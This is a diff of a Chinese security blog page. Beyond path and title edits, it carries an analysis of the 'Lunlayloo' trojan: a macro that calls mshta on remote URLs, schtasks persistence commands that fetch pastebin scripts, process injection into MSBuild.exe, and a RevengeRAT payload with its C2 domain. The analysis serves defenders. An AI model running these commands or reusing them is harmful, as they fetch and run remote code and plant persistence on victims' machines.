@@ -7,15 +7,15 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/cray/img/apple-touch-icon.png">
-  <link rel="icon" type="image/png" href="/cray/img/favicon.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  <meta name="description" content="个人学习生活博客,寻志同道合朋友相互学习,共同进步.">
+  <meta name="description" content="安全行业从业者，主要方向PC逆向附带安卓和Linux逆向，时不时喜欢写点BUG代码">
   <meta name="author" content="Cray">
   <meta name="keywords" content>
-  <title>Lunlayloo 木马 ~ CrayBlog</title>
+  <title>Lunlayloo 木马 ~ 逆向安全博客</title>
 
   <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
 <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
@@ -24,9 +24,9 @@
 <link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
 
 
-  <link rel="stylesheet" href="/cray/lib/prettify/tomorrow.min.css">
+  <link rel="stylesheet" href="/lib/prettify/tomorrow.min.css">
 
-<link rel="stylesheet" href="/cray/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
   <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
@@ -39,8 +39,7 @@
   <header style="height: 70vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand"
-       href="/cray/">&nbsp;<strong>CrayBlog</strong>&nbsp;</a>
+
 
     <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
             data-target="#navbarSupportedContent"
@@ -57,7 +56,7 @@
           
           
           <li class="nav-item">
-            <a class="nav-link" href="/cray/">首页</a>
+            <a class="nav-link" href="/">首页</a>
           </li>
         
           
@@ -65,7 +64,7 @@
           
           
           <li class="nav-item">
-            <a class="nav-link" href="/cray/archives/">归档</a>
+            <a class="nav-link" href="/archives/">归档</a>
           </li>
         
           
@@ -73,7 +72,7 @@
           
           
           <li class="nav-item">
-            <a class="nav-link" href="/cray/tags/">标签</a>
+            <a class="nav-link" href="/tags/">标签</a>
           </li>
         
           
@@ -81,7 +80,7 @@
           
           
           <li class="nav-item">
-            <a class="nav-link" href="/cray/links/">友链</a>
+            <a class="nav-link" href="/links/">友链</a>
           </li>
         
         
@@ -96,12 +95,15 @@
 </nav>
 
     <div class="view intro-2" id="background" false
-         style="background: url('https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_b10b643428.jpg') no-repeat center center;
-           background-size: cover;">
-      <div class="full-bg-img">
+      style="background: url('https://dc.snscz.com/s2/img/original/2019/04/01/14/14004_b10b643428.jpg') no-repeat center center;
+      background-size: cover;">
+    
+        <div class="full-bg-img">
         <div class="mask rgba-black-light flex-center">
           <div class="container text-center white-text fadeInUp">
             <span class="h2" id="subtitle">
+              
+                Lunlayloo 木马
               
             </span>
 
@@ -172,27 +174,27 @@
 </tr>
 </tbody></table>
 <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>该样本语言类型为 VBS和JS编写，中间过程完全使用无文件格式，内容也都能随时在线更改，在一定程序上能躲避安全软件的查杀，通过不同混淆更容易达到免杀的效果。</p>
-<h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://img-blog.csdnimg.cn/20190920124614242.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p>
-<h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p>文件有宏，且宏有密码，可以使用<code>offkey</code>直接更改宏密码<br>进入宏代码后在<code>shell(fun)</code>处下断，可以拿到shell 的连接地址<br><img src="https://img-blog.csdnimg.cn/20190916212336956.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"> <code>mshta http://bit.ly/8hsshjahassahsh</code></p>
-<p>打开这个页面看似是一个正常页面，但仔细查找是能在源码中找到恶意js代码的<br><img src="https://img-blog.csdnimg.cn/20190917141638561.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>拿出来使用<code>console</code>打印出来<br><img src="https://img-blog.csdnimg.cn/20190917141856253.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190917143320931.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>处理后执行了<code>WScript.Shell.Run mshta http://www.pastebin.com/raw/nv5d9pYu,vbHide</code><br>看看究竟是什么东西<br>木马作者选择了一个匿名代码存放地址网站，来逃避追踪。<br>但是目前这个RWA地址页面已经被删除了<br><img src="https://img-blog.csdnimg.cn/20190917143741625.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>这个样本在any.run上有人运行过，有记录，所以可以找到这个访问记录。<br><a href="https://app.any.run/tasks/0100486e-1711-4af6-a437-74ad27216f36/" target="_blank" rel="noopener">https://app.any.run/tasks/0100486e-1711-4af6-a437-74ad27216f36/</a><br><img src="https://img-blog.csdnimg.cn/20190917144032656.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>拿出这个代码<br><img src="https://img-blog.csdnimg.cn/20190917144558325.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>下面看看怎么玩的，关闭打开的excel word ppt msp软件，让中马的人以为想不到是宏的原因，给人 眼部见为净 的感觉</p>
-<p><img src="https://img-blog.csdnimg.cn/20190917151722331.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p>
+<h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2><p><img src="https://img-blog.csdnimg.cn/20190920124614242.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<h2 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h2><p>文件有宏，且宏有密码，可以使用<code>offkey</code>直接更改宏密码<br>进入宏代码后在<code>shell(fun)</code>处下断，可以拿到shell 的连接地址<br><img src="https://img-blog.csdnimg.cn/20190916212336956.png" srcset="/img/loading.gif" alt="在这里插入图片描述"> <code>mshta http://bit.ly/8hsshjahassahsh</code></p>
+<p>打开这个页面看似是一个正常页面，但仔细查找是能在源码中找到恶意js代码的<br><img src="https://img-blog.csdnimg.cn/20190917141638561.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>拿出来使用<code>console</code>打印出来<br><img src="https://img-blog.csdnimg.cn/20190917141856253.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190917143320931.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>处理后执行了<code>WScript.Shell.Run mshta http://www.pastebin.com/raw/nv5d9pYu,vbHide</code><br>看看究竟是什么东西<br>木马作者选择了一个匿名代码存放地址网站，来逃避追踪。<br>但是目前这个RWA地址页面已经被删除了<br><img src="https://img-blog.csdnimg.cn/20190917143741625.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>这个样本在any.run上有人运行过，有记录，所以可以找到这个访问记录。<br><a href="https://app.any.run/tasks/0100486e-1711-4af6-a437-74ad27216f36/" target="_blank" rel="noopener">https://app.any.run/tasks/0100486e-1711-4af6-a437-74ad27216f36/</a><br><img src="https://img-blog.csdnimg.cn/20190917144032656.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>拿出这个代码<br><img src="https://img-blog.csdnimg.cn/20190917144558325.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>下面看看怎么玩的，关闭打开的excel word ppt msp软件，让中马的人以为想不到是宏的原因，给人 眼部见为净 的感觉</p>
+<p><img src="https://img-blog.csdnimg.cn/20190917151722331.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>接着又安装两个计划任务，来持久化攻击和进一步执行操作</p>
-<p><code>schtasks /create /sc MINUTE /mo 60 /tn Windows Update /tr mshta.exe http://pastebin.com/raw/vXpe74L2 /F</code><img src="https://img-blog.csdnimg.cn/20190917154541622.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><code>schtasks /create /sc MINUTE /mo 300 /tn Update /tr mshta.exe http://pastebin.com/raw/JdTuFmc5 /F</code><br><img src="https://img-blog.csdnimg.cn/20190917154555627.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>通过schtasks  创建两个计划任务来执行两个脚本文件<br>还加入了一个开启自启动<br><img src="https://img-blog.csdnimg.cn/2019091715561730.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><code>schtasks /create /sc MINUTE /mo 60 /tn Windows Update /tr mshta.exe http://pastebin.com/raw/vXpe74L2 /F</code><img src="https://img-blog.csdnimg.cn/20190917154541622.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><code>schtasks /create /sc MINUTE /mo 300 /tn Update /tr mshta.exe http://pastebin.com/raw/JdTuFmc5 /F</code><br><img src="https://img-blog.csdnimg.cn/20190917154555627.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>通过schtasks  创建两个计划任务来执行两个脚本文件<br>还加入了一个开启自启动<br><img src="https://img-blog.csdnimg.cn/2019091715561730.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>接下来看看这三个脚本是怎么操作的</p>
 <p><code>JdTuFmc5</code> 又是一系列加密，下面是解密后的结果</p>
-<p><img src="https://img-blog.csdnimg.cn/20190919105945345.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>尝试去下载并执行两个.net编写的可执行程序，暂时命名为<code>bit1.bin</code>和<code>2bit1.bin</code>后面分析</p>
-<p>在<code>wMG90xwi</code>这个raw中定义了一个<code>$a</code>对象，这个对象是将上面的bit1.bin读入内存的对象，可以直接使用<br><img src="https://img-blog.csdnimg.cn/20190919105430408.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>使用dnspy打开反编译这个dll</p>
+<p><img src="https://img-blog.csdnimg.cn/20190919105945345.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>尝试去下载并执行两个.net编写的可执行程序，暂时命名为<code>bit1.bin</code>和<code>2bit1.bin</code>后面分析</p>
+<p>在<code>wMG90xwi</code>这个raw中定义了一个<code>$a</code>对象，这个对象是将上面的bit1.bin读入内存的对象，可以直接使用<br><img src="https://img-blog.csdnimg.cn/20190919105430408.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>使用dnspy打开反编译这个dll</p>
 <p>里面就有<code>THC452563sdfdsdfgr4777cxg04477fsdf810df777</code>类和它的方法<code>retrt477fdg145fd4g0wewerwedsa799221dsad4154qwe(string FTONJ, byte[] coco)</code> </p>
-<p><img src="https://img-blog.csdnimg.cn/20190919110436546.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>然后使用<code>Invoke</code>去调用了这个方法，且传入的参数是(‘MSBuild.exe’,$f)</p>
+<p><img src="https://img-blog.csdnimg.cn/20190919110436546.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>然后使用<code>Invoke</code>去调用了这个方法，且传入的参数是(‘MSBuild.exe’,$f)</p>
 <p>查一下壳，发现是加了<code>Confuser</code>的混淆</p>
-<p>解完混淆之后再看<br><img src="https://img-blog.csdnimg.cn/20190920183121543.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>会按照顺序去检测文件<code>MSBuild.exe</code>存在在哪，然后调用<code>ticklens</code><br><img src="https://img-blog.csdnimg.cn/20190920183342286.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><code>PEHeaderE</code>函数是在修改程序自身代码<br><img src="https://img-blog.csdnimg.cn/20190920184816602.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述">主要看<code>FUN</code><br><img src="https://img-blog.csdnimg.cn/20190920184846835.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>发现是在循环调用<code>smethod_0</code>方法，这个方法就是真正的创建傀儡进程</p>
+<p>解完混淆之后再看<br><img src="https://img-blog.csdnimg.cn/20190920183121543.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>会按照顺序去检测文件<code>MSBuild.exe</code>存在在哪，然后调用<code>ticklens</code><br><img src="https://img-blog.csdnimg.cn/20190920183342286.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><code>PEHeaderE</code>函数是在修改程序自身代码<br><img src="https://img-blog.csdnimg.cn/20190920184816602.png" srcset="/img/loading.gif" alt="在这里插入图片描述">主要看<code>FUN</code><br><img src="https://img-blog.csdnimg.cn/20190920184846835.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>发现是在循环调用<code>smethod_0</code>方法，这个方法就是真正的创建傀儡进程</p>
 <p><code>lpname</code> 指向要打开的进程</p>
 <p><code>lpBuf</code> 是要注入的数据</p>
-<p><img src="https://img-blog.csdnimg.cn/20190920185315420.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/2019092018553021.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190920185552483.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190920185722874.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190920185657512.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190920185749272.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>上面就是典型的进程注入  作用是将第二个可执行程序注入到<code>MSBuild.exe</code>中</p>
+<p><img src="https://img-blog.csdnimg.cn/20190920185315420.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/2019092018553021.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190920185552483.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190920185722874.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190920185657512.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190920185749272.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>上面就是典型的进程注入  作用是将第二个可执行程序注入到<code>MSBuild.exe</code>中</p>
 <p>这里就直接看一下 这个注入的程序到底是什么</p>
 <p>反编译下一个2bit2.bin</p>
-<p>根据关键字搜索，可以发现这是<code>RevengeRAT</code>远控生成的客户端<br><img src="https://img-blog.csdnimg.cn/20190920111854823.png" srcset="/cray/img/loading.gif" alt="在这里插入图片描述"><br>这个远控是一个有免费版本，网络上也有泄露的版本，因为是.net编写，基本功能也都能识别出来</p>
+<p>根据关键字搜索，可以发现这是<code>RevengeRAT</code>远控生成的客户端<br><img src="https://img-blog.csdnimg.cn/20190920111854823.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>这个远控是一个有免费版本，网络上也有泄露的版本，因为是.net编写，基本功能也都能识别出来</p>
 <p>首先是C2地址 <code>meandmyjoggar.duckdns.org:777</code></p>
 <p>程序互斥体名 <code>RV_MUTEX-WindowsUpdateSysten32</code></p>
 <p>两个计划任务和加入的启动项注册表都是一样的程序，这里就不累述了</p>
@@ -245,7 +247,7 @@
               <span>
                 <i class="iconfont icon-inbox"></i>
                 
-                  <a class="hover-with-bg" href="/cray/categories/样本详细分析/">样本详细分析</a>
+                  <a class="hover-with-bg" href="/categories/样本详细分析/">样本详细分析</a>
                   &nbsp;
                 
               </span>&nbsp;&nbsp;
@@ -254,7 +256,7 @@
               <span>
                 <i class="iconfont icon-tag"></i>
                 
-                  <a class="hover-with-bg" href="/cray/tags/Rat-H-worm/">Rat H-worm</a>
+                  <a class="hover-with-bg" href="/tags/Rat-H-worm/">Rat H-worm</a>
                 
               </span>
             
@@ -291,7 +293,7 @@
     <div id="disqus_thread"></div>
     <script>
       var disqus_config = function () {
-        this.page.url = 'http://l0yy.gitee.io/cray/2019/09/06/Lunlayloo 木马/';
+        this.page.url = 'http://cve.gitee.io/cve/2019/09/06/Lunlayloo 木马/';
         this.page.identifier = '/2019/09/06/Lunlayloo 木马/';
       };
       var oldLoad = window.onload;
@@ -383,10 +385,10 @@
 <script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
 <script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
 <script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
-<script src="/cray/js/main.js" ></script>
+<script src="/js/main.js" ></script>
 
 
-  <script src="/cray/js/lazyload.js" ></script>
+  <script src="/js/lazyload.js" ></script>
 
 
 
@@ -457,24 +459,6 @@
 
 
 
-  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
-  <script>
-    var typed = new Typed('#subtitle', {
-      strings: [
-        '  ',
-        "Lunlayloo 木马&nbsp;",
-      ],
-      cursorChar: "_",
-      typeSpeed: 70,
-      loop: false,
-    });
-    typed.stop();
-    $(document).ready(function () {
-      $(".typed-cursor").addClass("h2");
-      typed.start();
-    });
-  </script>
-
 
 
   <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
@@ -494,9 +478,9 @@
 
 
 
-  <script src="/cray/js/local-search.js" ></script>
+  <script src="/js/local-search.js" ></script>
   <script>
-    var path = "/cray/local-search.xml";
+    var path = "/local-search.xml";
     var inputArea = document.querySelector("#local-search-input");
     inputArea.onclick = function () {
       getSearchFile(path);
